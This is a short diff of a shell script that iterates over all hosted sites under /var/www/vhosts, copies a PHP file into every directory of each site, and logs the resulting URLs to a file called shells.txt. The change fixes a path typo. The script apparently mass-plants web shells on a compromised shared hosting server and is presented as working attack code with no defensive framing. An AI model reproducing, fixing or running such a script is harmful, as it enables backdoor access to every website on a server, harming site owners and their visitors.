@@ -5,7 +5,7 @@ mkdir /tmp/hello-index
 ls -la /var/www/vhosts/ | awk '{print $9}' > /tmp/betobeh
 for i in `more /tmp/betobeh `
 do
-	find /var/www/vhost/$i -type d -exec cp /root/egy-batats.php {} \;
+	find /var/www/vhosts/$i -type d -exec cp /root/egy-batats.php {} \;
 	echo " [*] $i -> Done"
 	echo "https://$i/$shell" >> /var/www/vhosts/shells.txt
 done
